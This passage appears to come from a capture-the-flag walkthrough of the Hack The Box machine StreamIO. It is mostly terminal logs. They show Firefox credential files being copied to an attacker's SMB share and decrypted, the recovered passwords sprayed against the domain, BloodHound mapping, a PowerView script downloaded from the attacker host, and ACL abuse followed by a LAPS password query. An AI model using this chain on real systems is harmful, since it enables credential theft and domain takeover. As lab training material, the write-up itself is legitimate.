-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

```bash
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.16.58\Enil /u:malus malus
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.16.58\enil
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.16.58\Enil

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo impacket-smbserver Enil . -smb2support -user malus -pass malus -smb2support
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.12.54,53727)
[*] AUTHENTICATE_MESSAGE (\malus,DC)
[*] User DC\malus authenticated successfully
[*] malus:::aaaaaaaaaaaaaaaa:fcfda4cc5c250ce65bf1d6075e2e74b1:01010000000000008050721c15c1dc01d5d014928c1558fa00000000010010004a007900570057004c004d004d006b00030010004a007900570057004c004d004d006b0002001000610046006b007200740041007a00530004001000610046006b007200740041007a005300070008008050721c15c1dc0106000400020000000800300030000000000000000000000000210000a210ca8440513f859abb562c6cb93a47041baf21276d64997c659f8a11474b820a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350038000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:Enil)
[*] Disconnecting Share(1:IPC$)
[*] Connecting Share(3:IPC$)
[*] Disconnecting Share(3:IPC$)
^CTraceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 108, in <module>
    server.start()
    ~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 4934, in start
    self.__server.serve_forever()
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/socketserver.py", line 235, in serve_forever
    ready = selector.select(poll_interval)
  File "/usr/lib/python3.13/selectors.py", line 398, in select
    fd_event_list = self._selector.poll(timeout)
KeyboardInterrupt
^CTraceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
    _thread_shutdown()
KeyboardInterrupt: 

                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah key4.db 
2771853 -rwxr-xr-x 1 root root 288K Mar 28  2022 key4.db
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah logins.json 
2774744 -rwxr-xr-x 1 root root 2.1K Mar 28  2022 logins.json
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah firefoxs  
total 300K
2782628 drwxrwxr-x 2 kali kali 4.0K Mar 31 09:57 .
2781595 drwxrwxr-x 4 kali kali 4.0K Mar 31 09:55 ..
2782630 -rwxr-xr-x 1 kali kali 288K Mar 31 09:56 key4.db
2782631 -rwxr-xr-x 1 kali kali 2.1K Mar 31 09:57 logins.json


┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ git clone https://github.com/lclevy/firepwd.git
Cloning into 'firepwd'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (31/31), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 111 (delta 15), reused 10 (delta 4), pack-reused 80 (from 1)
Receiving objects: 100% (111/111), 253.10 KiB | 1.82 MiB/s, done.
Resolving deltas: 100% (54/54), done.
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cd firepwd

┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO/firepwd]
└─$ python3 firepwd.py -d ../firefoxs                                                                                                                                                                                                                       
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

```bash
┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ vim firefox_creds
                                                                                                                                                                                                                                                             
┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat firefox_creds           
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

```bash
┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat firefox_creds | awk -F "'" '{print $2}' | tee fire_users
admin
nikk37
yoshihide
JDgodd
                                                                                                                                                                                                                                                             
┌──(firepwn)─(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ cat firefox_creds | awk -F "'" '{print $4}' | tee fire_pass 
JDg0dd1s@d0p3cr3@t0r
n1kk1sd0p3t00:)
paddpadd@12
password@12
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ crackmapexec smb streamio.htb -u fire_users -p fire_pass --continue-on-success
SMB         watch.streamIO.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ crackmapexec winrm streamio.htb -u fire_users -p fire_pass --continue-on-success
SMB         watch.streamIO.htb 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        watch.streamIO.htb 5985   DC               [*] http://watch.streamIO.htb:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\admin:paddpadd@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\admin:password@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\nikk37:paddpadd@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\nikk37:password@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\yoshihide:paddpadd@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\yoshihide:password@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\JDgodd:paddpadd@12
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       watch.streamIO.htb 5985   DC               [-] streamIO.htb\JDgodd:password@12

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ smbmap -H streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'                      

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.12.54:445        Name: streamio.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.12.116 -d streamio.htb -dc streamio.htb --zip                                                                        
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: streamio.htb
INFO: Testing resolved hostname connectivity dead:beef::1a9
INFO: Trying LDAP connection to dead:beef::1a9
INFO: Testing resolved hostname connectivity dead:beef::88b9:720e:3fbe:abf7
INFO: Trying LDAP connection to dead:beef::88b9:720e:3fbe:abf7
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Testing resolved hostname connectivity dead:beef::1a9
INFO: Trying LDAP connection to dead:beef::1a9
INFO: Testing resolved hostname connectivity dead:beef::88b9:720e:3fbe:abf7
INFO: Trying LDAP connection to dead:beef::88b9:720e:3fbe:abf7
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 31S
INFO: Compressing output into 20260401025555_bloodhound.zip
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ls -liah 20260401025555_bloodhound.zip 
2784945 -rw-rw-r-- 1 kali kali 141K Apr  1 02:56 20260401025555_bloodhound.zip
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ unzip -l 20260401025555_bloodhound.zip 
Archive:  20260401025555_bloodhound.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    82882  2026-04-01 02:56   20260401025555_groups.json
     7863  2026-04-01 02:56   20260401025555_gpos.json
     1986  2026-04-01 02:56   20260401025555_ous.json
    18581  2026-04-01 02:56   20260401025555_users.json
     4106  2026-04-01 02:56   20260401025555_computers.json
     3100  2026-04-01 02:56   20260401025555_domains.json
    24816  2026-04-01 02:56   20260401025555_containers.json
---------                     -------
   143334                     7 files

```

初始化 `neo4j`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ sudo neo4j restart
[sudo] password for kali: 
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:7154). It is available at http://localhost:7474
There may be a short delay until the server is ready.

```

![](Pasted%20image%2020260401150043.png)

初始账号密码为 `neo4j`，登入后重新设置密码。

启动 `bloodhound`，账号密码均为 `admin`。

![](Pasted%20image%2020260401150831.png)

导入刚刚采集到的数据。

![](Pasted%20image%2020260401150951.png)

搜索 `STREAMIO.HTB`，有数据返回，已经成功导入。

![](Pasted%20image%2020260401151334.png)

使用 `Add to Owned` 添加用户。

![](Pasted%20image%2020260401153329.png)

选择 `Shortest Path fron Owned Object`。

![](Pasted%20image%2020260401153947.png)

将 `DC` 设置为 `ending node`。

![](Pasted%20image%2020260401154337.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ la -lish PowerView.ps1 
2782461 756K -rw-rw-r-- 1 kali kali 753K Apr  2 09:19 PowerView.ps1
```

```bash
*Evil-WinRM* PS C:\programdata> powershell -c wget http://10.10.16.58/PowerView.ps1 -outfile PowerView.ps1
*Evil-WinRM* PS C:\programdata> dir


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        3/28/2022   2:53 PM                Microsoft
d-----        2/25/2022  11:17 PM                Mozilla-1de4eec8-1241-4177-a864-e594e8d1fb38
d-----        3/28/2022   2:53 PM                Package Cache
d-----         5/9/2022   6:03 PM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        3/28/2022   4:46 PM                ssh
d-----        2/22/2022   1:34 AM                USOPrivate
d-----        2/22/2022   1:34 AM                USOShared
d-----        2/22/2022   1:35 AM                VMware
-a----         4/2/2026   1:23 PM         770279 PowerView.ps1
```

```bash
*Evil-WinRM* PS C:\programdata> .\PowerView.ps1
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',$pass)
```

```bash
*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\programdata>  Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
└─$ ldapsearch -H ldap://10.129.13.8 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwds
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwds 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```